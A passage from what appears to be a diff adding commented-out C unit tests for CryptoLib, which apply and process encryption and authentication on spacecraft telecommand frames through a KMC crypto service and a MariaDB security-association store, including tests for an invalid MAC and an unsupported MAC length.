+//     TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1= "202c0408000001bd37";
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); if(status != CRYPTO_LIB_SUCCESS)
+//     {
+//         Crypto_Shutdown();
+//     }
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+// /**
+//  * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+//  **/
+// UTEST(KMC_CRYPTO_CAM, HAPPY_PATH_APPLY_SEC_AUTH_ONLY)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("localhost", "sadb", 3306, CRYPTO_FALSE, 0, NULL, NULL, NULL, NULL, NULL, "sa_user",
+//                           "sa_password");
+//     Crypto_Config_Kmc_Crypto_Service("https", "asec-dev-vm18.jpl.nasa.gov", 8443, "crypto-service",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/ammos-ca-bundle.crt",
+//                                      NULL, CRYPTO_FALSE,
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-cert.pem",
+//                                      "PEM",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-key.pem",
+//                                      NULL, NULL);
+//     Crypto_Config_Cam(CAM_ENABLED_TRUE,"/home/isaleh/.cam_cookie_file",NULL,CAM_LOGIN_NONE,NULL, NULL, NULL);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 0, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 1, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024,
+//     AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 2, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 3,
+//     TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1= "202c0C08000001bf1a";
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); if(status != CRYPTO_LIB_SUCCESS)
+//     {
+//         Crypto_Shutdown();
+//     }
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// /**
+//  * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+//  **/
+// UTEST(KMC_CRYPTO, HAPPY_PATH_PROCESS_SEC_ENC_AND_AUTH)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("localhost", "sadb", 3306, CRYPTO_FALSE, 0, NULL, NULL, NULL, NULL, NULL, "sa_user",
+//                           "sa_password");
+//     Crypto_Config_Kmc_Crypto_Service("https", "asec-dev-vm18.jpl.nasa.gov", 8443, "crypto-service",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/ammos-ca-bundle.crt",
+//                                      NULL, CRYPTO_FALSE,
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-cert.pem",
+//                                      "PEM",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-key.pem",
+//                                      NULL, NULL);
+//     Crypto_Config_Cam(CAM_ENABLED_TRUE,"/home/isaleh/.cam_cookie_file",NULL,CAM_LOGIN_NONE,NULL, NULL, NULL);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 0, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 1, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024,
+//     AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 2, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 3,
+//     TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* enc_tc_jpl_mmt_scid44_vcid1=
+//     "202C0426000002000000000000000000000001669C5639DCCFEA8C6CE33230EE2E7065496367CC"; char*
+//     enc_tc_jpl_mmt_scid44_vcid1_expect = NULL; int enc_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     // Data=0001
+//     // IV=000000000000000000000001
+//     // AAD=00000000000000000000000000000000000000
+
+//     TC_t* tc_processed_frame;
+//     tc_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+
+//     hex_conversion(enc_tc_jpl_mmt_scid44_vcid1, &enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Encrypted Frame Before Processing:\n");
+//     for (int i=0; i<enc_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)enc_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ProcessSecurity((uint8_t* )enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len, tc_processed_frame); if(status != CRYPTO_LIB_SUCCESS)
+//     {
+//         Crypto_Shutdown();
+//     }
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Processed PDU:\n");
+//     for (int i=0; i<tc_processed_frame->tc_pdu_len; i++)
+//     {
+//         printf("%02x ", tc_processed_frame->tc_pdu[i]);
+//     }
+//     printf("\n");
+
+//     ASSERT_EQ(0x00,tc_processed_frame->tc_pdu[0]);
+//     ASSERT_EQ( 0x01,tc_processed_frame->tc_pdu[1]);
+
+//     Crypto_Shutdown();
+//     free(enc_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+// /**
+//  * @brief Unit Test: Nominal Encryption with KMC Crypto Service && JPL Unit Test MariaDB
+//  * This doesn't work -- Apply Security Auth Only doesn't return the proper tag.
+//  **/
+// UTEST(KMC_CRYPTO_CAM, HAPPY_PATH_PROCESS_SEC_AUTH_ONLY)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("localhost", "sadb", 3306, CRYPTO_FALSE, 0, NULL, NULL, NULL, NULL, NULL, "sa_user",
+//                           "sa_password");
+//     Crypto_Config_Kmc_Crypto_Service("https", "asec-dev-vm18.jpl.nasa.gov", 8443, "crypto-service",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/ammos-ca-bundle.crt",
+//                                      NULL, CRYPTO_FALSE,
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-cert.pem",
+//                                      "PEM",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-key.pem",
+//                                      NULL, NULL);
+//     Crypto_Config_Cam(CAM_ENABLED_TRUE,"/home/isaleh/.cam_cookie_file",NULL,CAM_LOGIN_NONE,NULL, NULL, NULL);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 0, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 1, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024,
+//     AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 2, TC_HAS_FECF,
+//     TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 3,
+//     TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA, AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* enc_tc_jpl_mmt_scid44_vcid1=
+//     "202C0C2600000400000000000000000000000100016E2051F96CAB186BCE364A65AF599AE52F38"; char*
+//     enc_tc_jpl_mmt_scid44_vcid1_expect = NULL; int enc_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     // Data=0001
+//     // IV=000000000000000000000001
+//     // AAD=00000000000000000000000000000000000000
+
+//     TC_t* tc_processed_frame;
+//     tc_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+
+//     hex_conversion(enc_tc_jpl_mmt_scid44_vcid1, &enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Encrypted Frame Before Processing:\n");
+//     for (int i=0; i<enc_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)enc_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ProcessSecurity((uint8_t* )enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len, tc_processed_frame);
+
+//     if(status != CRYPTO_LIB_SUCCESS)
+//     {
+//         Crypto_Shutdown();
+//     }
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     // Expected to fail -- KMC doesn't support 0 cipher text input for decrypt function.
+//     // ASSERT_EQ(CRYPTOGRAHPY_KMC_CRYPTO_SERVICE_GENERIC_FAILURE, status);
+//     printf("Processed PDU:\n");
+//     for (int i=0; i<tc_processed_frame->tc_pdu_len; i++)
+//     {
+//         printf("%02x ", tc_processed_frame->tc_pdu[i]);
+//     }
+//     printf("\n");
+
+//     // ASSERT_EQ(0x00,tc_processed_frame->tc_pdu[0]);
+//     // ASSERT_EQ( 0x01,tc_processed_frame->tc_pdu[1]);
+
+//     Crypto_Shutdown();
+//     free(enc_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     // ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// UTEST(KMC_CRYPTO_CAM, HAPPY_PATH_APPLY_SEC_ENC_AND_AUTH_AESGCM_8BYTE_MAC)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("localhost", "sadb", 3306, CRYPTO_FALSE, 0, NULL, NULL, NULL, NULL, NULL, "sa_user",
+//                           "sa_password");
+//     Crypto_Config_Kmc_Crypto_Service("https", "asec-dev-vm18.jpl.nasa.gov", 8443, "crypto-service",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/ammos-ca-bundle.crt",
+//                                      NULL, CRYPTO_FALSE,
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-cert.pem",
+//                                      "PEM",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-key.pem",
+//                                      NULL, NULL);
+//     Crypto_Config_Cam(CAM_ENABLED_TRUE,"/home/isaleh/.cam_cookie_file",NULL,CAM_LOGIN_NONE,NULL, NULL, NULL);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 11, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1= "202c2c08000001bd37";
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); if(status != CRYPTO_LIB_SUCCESS)
+//     {
+//         Crypto_Shutdown();
+//     }
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Frame after encryption:\n");
+//     for (int i=0; i<enc_frame_len; i++)
+//     {
+//         printf("%02x ", ptr_enc_frame[i]);
+//     }
+//     printf("\n");
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// UTEST(KMC_CRYPTO_CAM, HAPPY_PATH_PROCESS_SEC_ENC_AND_AUTH_AESGCM_8BYTE_MAC)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("localhost", "sadb", 3306, CRYPTO_FALSE, 0, NULL, NULL, NULL, NULL, NULL, "sa_user",
+//                           "sa_password");
+//     Crypto_Config_Kmc_Crypto_Service("https", "asec-dev-vm18.jpl.nasa.gov", 8443, "crypto-service",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/ammos-ca-bundle.crt",
+//                                      NULL, CRYPTO_FALSE,
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-cert.pem",
+//                                      "PEM",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-key.pem",
+//                                      NULL, NULL);
+//     Crypto_Config_Cam(CAM_ENABLED_TRUE,"/home/isaleh/.cam_cookie_file",NULL,CAM_LOGIN_NONE,NULL, NULL, NULL);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 11, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* enc_tc_jpl_mmt_scid44_vcid1= "202C2C1E000009000000000000000000000001669C5639DCCFEA8C6CE3AA71";
+//     char* enc_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int enc_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     // Data=0001
+//     // IV=000000000000000000000001
+//     // AAD=00000000000000000000000000000000000000
+
+//     TC_t* tc_processed_frame;
+//     tc_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+
+//     hex_conversion(enc_tc_jpl_mmt_scid44_vcid1, &enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Encrypted Frame Before Processing:\n");
+//     for (int i=0; i<enc_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)enc_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ProcessSecurity((uint8_t* )enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len, tc_processed_frame); if(status != CRYPTO_LIB_SUCCESS)
+//     {
+//         Crypto_Shutdown();
+//     }
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+//     printf("Processed PDU:\n");
+//     for (int i=0; i<tc_processed_frame->tc_pdu_len; i++)
+//     {
+//         printf("%02x ", tc_processed_frame->tc_pdu[i]);
+//     }
+//     printf("\n");
+
+//     ASSERT_EQ(0x00,tc_processed_frame->tc_pdu[0]);
+//     ASSERT_EQ( 0x01,tc_processed_frame->tc_pdu[1]);
+
+//     Crypto_Shutdown();
+//     free(enc_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+// }
+
+// UTEST(KMC_CRYPTO_CAM, UNHAPPY_PATH_INVALID_MAC_PROCESS_SEC_ENC_AND_AUTH_AESGCM_8BYTE_MAC)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("localhost", "sadb", 3306, CRYPTO_FALSE, 0, NULL, NULL, NULL, NULL, NULL, "sa_user",
+//                           "sa_password");
+//     Crypto_Config_Kmc_Crypto_Service("https", "asec-dev-vm18.jpl.nasa.gov", 8443, "crypto-service",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/ammos-ca-bundle.crt",
+//                                      NULL, CRYPTO_FALSE,
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-cert.pem",
+//                                      "PEM",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-key.pem",
+//                                      NULL, NULL);
+//     Crypto_Config_Cam(CAM_ENABLED_TRUE,"/home/isaleh/.cam_cookie_file",NULL,CAM_LOGIN_NONE,NULL, NULL, NULL);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 11, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* enc_tc_jpl_mmt_scid44_vcid1= "202C2C1E000009000000000000000000000001669C5639DCCDEA8C6CE3EEF2";
+//     char* enc_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int enc_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     // Data=0001
+//     // IV=000000000000000000000001
+//     // AAD=00000000000000000000000000000000000000
+
+//     TC_t* tc_processed_frame;
+//     tc_processed_frame = malloc(sizeof(uint8_t) * TC_SIZE);
+
+//     hex_conversion(enc_tc_jpl_mmt_scid44_vcid1, &enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Encrypted Frame Before Processing:\n");
+//     for (int i=0; i<enc_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)enc_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ProcessSecurity((uint8_t* )enc_tc_jpl_mmt_scid44_vcid1_expect,
+//     &enc_tc_jpl_mmt_scid44_vcid1_expect_len, tc_processed_frame); if(status != CRYPTO_LIB_SUCCESS)
+//     {
+//         Crypto_Shutdown();
+//     }
+//     ASSERT_EQ(CRYPTOGRAHPY_KMC_CRYPTO_SERVICE_GENERIC_FAILURE, status);
+
+//     Crypto_Shutdown();
+//     free(enc_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+// }
+
+// //16 bytes is max for AES GCM so this is an error test
+// UTEST(KMC_CRYPTO_CAM, UNHAPPY_PATH_APPLY_SEC_ENC_AND_AUTH_AESGCM_32BYTE_MAC)
+// {
+//     // Setup & Initialize CryptoLib
+//     Crypto_Config_CryptoLib(KEY_TYPE_KMC, MC_TYPE_DISABLED, SA_TYPE_MARIADB, CRYPTOGRAPHY_TYPE_KMCCRYPTO,
+//                             IV_INTERNAL, CRYPTO_TC_CREATE_FECF_TRUE, TC_PROCESS_SDLS_PDUS_FALSE, TC_NO_PUS_HDR,
+//                             TC_IGNORE_SA_STATE_FALSE, TC_IGNORE_ANTI_REPLAY_TRUE, TC_UNIQUE_SA_PER_MAP_ID_FALSE,
+//                             TC_CHECK_FECF_TRUE, 0x3F, SA_INCREMENT_NONTRANSMITTED_IV_TRUE);
+//     Crypto_Config_MariaDB("localhost", "sadb", 3306, CRYPTO_FALSE, 0, NULL, NULL, NULL, NULL, NULL, "sa_user",
+//                           "sa_password");
+//     Crypto_Config_Kmc_Crypto_Service("https", "asec-dev-vm18.jpl.nasa.gov", 8443, "crypto-service",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/ammos-ca-bundle.crt",
+//                                      NULL, CRYPTO_FALSE,
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-cert.pem",
+//                                      "PEM",
+//                                      "/home/isaleh/git/KMC/CryptoLib-IbraheemYSaleh/util/etc/local-test-key.pem",
+//                                      NULL, NULL);
+//     Crypto_Config_Cam(CAM_ENABLED_TRUE,"/home/isaleh/.cam_cookie_file",NULL,CAM_LOGIN_NONE,NULL, NULL, NULL);
+//     Crypto_Config_Add_Gvcid_Managed_Parameter(0, 0x002C, 12, TC_HAS_FECF, TC_NO_SEGMENT_HDRS, 1024, AOS_FHEC_NA,
+//     AOS_IZ_NA, 0); int32_t status = Crypto_Init();
+
+//     char* raw_tc_jpl_mmt_scid44_vcid1= "202c3008000001bd37";
+//     char* raw_tc_jpl_mmt_scid44_vcid1_expect = NULL;
+//     int raw_tc_jpl_mmt_scid44_vcid1_expect_len = 0;
+
+//     hex_conversion(raw_tc_jpl_mmt_scid44_vcid1, &raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     &raw_tc_jpl_mmt_scid44_vcid1_expect_len);
+
+//     uint8_t* ptr_enc_frame = NULL;
+//     uint16_t enc_frame_len = 0;
+
+//     ASSERT_EQ(CRYPTO_LIB_SUCCESS, status);
+
+//     printf("Frame before encryption:\n");
+//     for (int i=0; i<raw_tc_jpl_mmt_scid44_vcid1_expect_len; i++)
+//     {
+//         printf("%02x ", (uint8_t)raw_tc_jpl_mmt_scid44_vcid1_expect[i]);
+//     }
+//     printf("\n");
+
+//     status = Crypto_TC_ApplySecurity((uint8_t* )raw_tc_jpl_mmt_scid44_vcid1_expect,
+//     raw_tc_jpl_mmt_scid44_vcid1_expect_len, &ptr_enc_frame, &enc_frame_len); if(status != CRYPTO_LIB_SUCCESS)
+//     {
+//         Crypto_Shutdown();
+//     }
+//     // we expect an InvalidAlgorithmParameterException for macLength of that size.
+//     ASSERT_EQ(CRYPTOGRAHPY_KMC_CRYPTO_SERVICE_GENERIC_FAILURE, status);
+
+//     Crypto_Shutdown();
+//     free(raw_tc_jpl_mmt_scid44_vcid1_expect);
+//     free(ptr_enc_frame);
+// }
+
+UTEST_MAIN();
+```
+
+### `ut_kmc_crypto_with_mtls_sadb.c`
+
